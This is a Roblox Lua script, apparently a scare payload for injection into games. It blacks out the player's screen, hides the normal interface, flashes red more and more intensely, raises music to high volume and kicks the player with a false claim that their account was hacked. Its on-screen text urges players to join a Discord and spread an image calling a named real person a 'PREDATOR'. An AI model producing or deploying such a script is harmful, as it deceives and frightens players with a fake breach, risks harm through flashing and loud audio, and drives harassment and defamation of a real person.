-----/Services/-----
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

-----/Variables/-----
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-----/Values/-----
local Settings = {
	Name = "DavidHack",
	DisplayOrder = 1999999999,

	ThemeSoundId = "rbxassetid://138638346450081",
	MusicSoundId = "rbxassetid://139807624552008",

	ThemeSpeed = 1,
	ThemeIncrease = 0.05,
	ThemeMaxSpeed = 2,

	MusicVolume = 0.1,
	MusicMaxVolume = 2,
	MusicPlaybackSpeed = 20,

	Title = "David Baszucki has hacked this game",

	Description = [[Stop David Baszucki before he hacks your Roblox account too! He is on Discord!

1. Join the Discord (copy the link)
2. Complain about David Baszucki in the #General chat!
3. Post the image in #General chat! Copy the link]],

	Discord = "https://discord.gg/zdjjJTuP3M",
	Image = "DAVID IS PREDATOR https://imgur.com/y4AMLmk",

	KickMessage = "David Baszucki hacked you're account!",
}

-----/Functions/-----
local function Create(ClassName, Properties, Parent)
	local Object = Instance.new(ClassName)

	for Property, Value in pairs(Properties or {}) do
		Object[Property] = Value
	end

	Object.Parent = Parent

	return Object
end

local function CreateTextLabel(Properties, Parent)
	return Create("TextLabel", {
		BorderSizePixel = 0,
		BackgroundTransparency = 1,

		TextWrapped = true,
		TextScaled = true,
		TextSize = 14,

		FontFace = Font.new(
			"rbxasset://fonts/families/Inconsolata.json",
			Enum.FontWeight.Regular,
			Enum.FontStyle.Normal
		),

		TextColor3 = Properties.TextColor3 or Color3.fromRGB(255, 255, 255),

		Size = Properties.Size,
		Position = Properties.Position,
		Text = Properties.Text or "",

		TextXAlignment = Properties.TextXAlignment or Enum.TextXAlignment.Left,
	}, Parent)
end

local function CreateInput(Name, Text, Position, Parent)
	local Input = Create("TextBox", {
		Name = Name,

		BorderSizePixel = 0,
		TextEditable = false,
		TextWrapped = true,
		TextScaled = true,
		TextSize = 14,

		TextColor3 = Color3.fromRGB(201, 201, 201),
		BackgroundColor3 = Color3.fromRGB(16, 16, 16),

		FontFace = Font.new(
			"rbxasset://fonts/families/Inconsolata.json",
			Enum.FontWeight.Regular,
			Enum.FontStyle.Normal
		),

		ClearTextOnFocus = false,

		Size = UDim2.new(0.2459, 0, 0.06289, 0),
		Position = Position,

		Text = Text,
	}, Parent)

	Create("UIStroke", {
		Name = "UIBorder",
		Transparency = 0.8,
		Color = Color3.fromRGB(255, 255, 255),
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	}, Input)

	return Input
end

-----/Main/-----
local OldGui = PlayerGui:FindFirstChild(Settings.Name)

if OldGui then
	OldGui:Destroy()
end

local ScreenGui = Create("ScreenGui", {
	Name = Settings.Name,

	IgnoreGuiInset = true,
	DisplayOrder = Settings.DisplayOrder,

	Enabled = true,

	ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,

	ResetOnSpawn = false,
}, PlayerGui)

-----/Sounds/-----
local Theme = Create("Sound", {
	Name = "Theme",
	SoundId = Settings.ThemeSoundId,

	RollOffMode = Enum.RollOffMode.InverseTapered,
}, ScreenGui)

local Music = Create("Sound", {
	Name = "Music",
	SoundId = Settings.MusicSoundId,

	Volume = Settings.MusicVolume,
	Looped = true,

	RollOffMode = Enum.RollOffMode.InverseTapered,
}, ScreenGui)

-----/MainFrame/-----
local MainFrame = Create("Frame", {
	Name = "MainFrame",

	ZIndex = 2,
	BorderSizePixel = 0,

	BackgroundColor3 = Color3.fromRGB(0, 0, 0),
	BackgroundTransparency = 1,

	AnchorPoint = Vector2.new(0.5, 0.5),

	Size = UDim2.new(0.9991, 0, 1, 0),
	Position = UDim2.new(0.50045, 0, 0.49937, 0),
}, ScreenGui)

Create("UIPadding", {
	PaddingTop = UDim.new(0, 10),
	PaddingRight = UDim.new(0, 10),
	PaddingLeft = UDim.new(0, 10),
	PaddingBottom = UDim.new(0, 10),
}, MainFrame)

-----/Icon/-----
Create("ImageLabel", {
	Name = "Icon",

	BorderSizePixel = 0,

	BackgroundColor3 = Color3.fromRGB(255, 255, 255),
	BackgroundTransparency = 1,

	Image = "rbxassetid://80851751361988",

	Size = UDim2.new(0.24591, 0, 0.42918, 0),
}, MainFrame)

-----/Title/-----
CreateTextLabel({
	Name = "Title",

	Text = Settings.Title,

	TextColor3 = Color3.fromRGB(255, 0, 0),

	Size = UDim2.new(0.71665, 0, 0.06131, 0),
	Position = UDim2.new(0.26175, 0, 0, 0),

	TextXAlignment = Enum.TextXAlignment.Center,
}, MainFrame)

-----/Description/-----
CreateTextLabel({
	Name = "Description",

	Text = Settings.Description,

	Size = UDim2.new(0.60974, 0, 0.89836, 0),
	Position = UDim2.new(0.26175, 0, 0.07742, 0),
}, MainFrame)

-----/DiscordText/-----
CreateTextLabel({
	Name = "DiscordText",

	Text = "Discord Link :",

	Size = UDim2.new(0.2459, 0, 0.06289, 0),
	Position = UDim2.new(0, 0, 0.45806, 0),
}, MainFrame)

-----/DiscordLink/-----
CreateInput(
	"DiscordLink",
	Settings.Discord,
	UDim2.new(0, 0, 0.53419, 0),
	MainFrame
)

-----/ImageURLText/-----
CreateTextLabel({
	Name = "ImageURLText",

	Text = "Image URL :",

	Size = UDim2.new(0.2459, 0, 0.06289, 0),
	Position = UDim2.new(0, 0, 0.6129, 0),
}, MainFrame)

-----/ImageURL/-----
CreateInput(
	"ImageURL",
	Settings.Image,
	UDim2.new(0, 0, 0.69032, 0),
	MainFrame
)

-----/AspectRatio/-----
Create("UIAspectRatioConstraint", {
	AspectRatio = 1.76764,
	AspectType = Enum.AspectType.ScaleWithParentSize,
}, MainFrame)

-----/Flash/-----
local Flash = Create("Frame", {
	Name = "Flash",

	ZIndex = 3,
	BorderSizePixel = 0,

	BackgroundColor3 = Color3.fromRGB(255, 0, 0),
	BackgroundTransparency = 1,

	AnchorPoint = Vector2.new(0.5, 0.5),

	Size = UDim2.new(0, 2000, 0, 2000),
	Position = UDim2.new(0.5, 0, 0.5, 0),
}, ScreenGui)

-----/Blackout/-----
Create("Frame", {
	Name = "Blackout",

	BorderSizePixel = 0,

	BackgroundColor3 = Color3.fromRGB(0, 0, 0),

	AnchorPoint = Vector2.new(0.5, 0.5),

	Size = UDim2.new(0, 5000, 0, 5000),
	Position = UDim2.new(0.5, 0, 0.5, 0),
}, ScreenGui)

-----/Theme/-----
local Speed = Settings.ThemeSpeed

local function CheckTheme()
	if ScreenGui.Enabled then
		Theme.PlaybackSpeed = Speed
		Theme:Play()
	else
		Theme:Pause()
	end
end

Theme.Ended:Connect(function()
	if not ScreenGui.Enabled then
		return
	end

	Speed += Settings.ThemeIncrease

	local Visibility = math.clamp(
		Flash.BackgroundTransparency - Settings.ThemeIncrease,
		0,
		1
	)

	TweenService:Create(
		Flash,
		TweenInfo.new(0.1),
		{
			BackgroundTransparency = Visibility,
		}
	):Play()

	if Speed >= Settings.ThemeMaxSpeed then
		Player:Kick(Settings.KickMessage)
		return
	end

	Theme.PlaybackSpeed = Speed
	Theme:Play()
end)

-----/Music/-----
local function CheckMusic()
	if ScreenGui.Enabled then
		Music.PlaybackSpeed = Settings.MusicPlaybackSpeed
		Music:Play()
	else
		Music:Pause()
	end
end

TweenService:Create(
	Music,
	TweenInfo.new(Settings.MusicPlaybackSpeed),
	{
		Volume = Settings.MusicMaxVolume,
	}
):Play()

-----/CoreGui/-----
local function CheckCoreGui()
	if not ScreenGui.Enabled then
		return
	end

	pcall(function()
		StarterGui:SetCoreGuiEnabled(
			Enum.CoreGuiType.All,
			false
		)
	end)
end

-----/Init/-----
CheckTheme()
CheckMusic()
CheckCoreGui()

ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
	CheckTheme()
	CheckMusic()
	CheckCoreGui()
end)
